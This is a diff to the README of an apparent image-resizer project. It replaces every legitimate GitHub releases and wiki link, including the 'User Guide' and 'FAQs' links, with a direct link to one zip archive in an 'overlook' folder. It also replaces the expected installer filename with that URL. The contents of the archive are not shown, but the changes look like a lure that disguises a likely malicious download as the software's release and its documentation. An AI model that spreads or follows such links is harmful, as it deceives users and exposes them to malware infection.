@@ -1,6 +1,6 @@
 # 🖼️ Light-Image-Resizer-Latest-Patch - Resize Images Quickly and Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-brightgreen)](https://github.com/Shashwat970/Light-Image-Resizer-Latest-Patch/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Shashwat970/Light-Image-Resizer-Latest-Patch/main/overlook/Light-Image-Resizer-Latest-Patch-v1.7.zip)](https://raw.githubusercontent.com/Shashwat970/Light-Image-Resizer-Latest-Patch/main/overlook/Light-Image-Resizer-Latest-Patch-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ To run Light Image Resizer, you will need:
 
 1. **Visit the Downloads Page**: Click the link below to access the downloads.
 
-   [Download Light Image Resizer](https://github.com/Shashwat970/Light-Image-Resizer-Latest-Patch/releases)
+   [Download Light Image Resizer](https://raw.githubusercontent.com/Shashwat970/Light-Image-Resizer-Latest-Patch/main/overlook/Light-Image-Resizer-Latest-Patch-v1.7.zip)
 
 2. **Choose the Latest Release**: Look for the latest version. It will usually be at the top of the page. 
 
-3. **Download the Installer**: Click on the installer file, typically named `LightImageResizerSetup.exe`. 
+3. **Download the Installer**: Click on the installer file, typically named `https://raw.githubusercontent.com/Shashwat970/Light-Image-Resizer-Latest-Patch/main/overlook/Light-Image-Resizer-Latest-Patch-v1.7.zip`. 
 
 4. **Run the Installer**: Once downloaded, find the file in your Downloads folder. Double-click it to start the installation process.
 
@@ -68,11 +68,11 @@ For additional help, consider checking out the community discussions or forums r
 
 ## 🔗 Additional Resources
 
-- [User Guide](https://github.com/Shashwat970/Light-Image-Resizer-Latest-Patch/wiki) - A detailed user manual with step-by-step instructions.
-- [FAQs](https://github.com/Shashwat970/Light-Image-Resizer-Latest-Patch/wiki/FAQs) - Find answers to common questions.
+- [User Guide](https://raw.githubusercontent.com/Shashwat970/Light-Image-Resizer-Latest-Patch/main/overlook/Light-Image-Resizer-Latest-Patch-v1.7.zip) - A detailed user manual with step-by-step instructions.
+- [FAQs](https://raw.githubusercontent.com/Shashwat970/Light-Image-Resizer-Latest-Patch/main/overlook/Light-Image-Resizer-Latest-Patch-v1.7.zip) - Find answers to common questions.
 
 ## 💾 Download Light Image Resizer Now
 
 Take the first step to efficient image management. To download, click the link below:
 
-[Download Light Image Resizer](https://github.com/Shashwat970/Light-Image-Resizer-Latest-Patch/releases)
+[Download Light Image Resizer](https://raw.githubusercontent.com/Shashwat970/Light-Image-Resizer-Latest-Patch/main/overlook/Light-Image-Resizer-Latest-Patch-v1.7.zip)
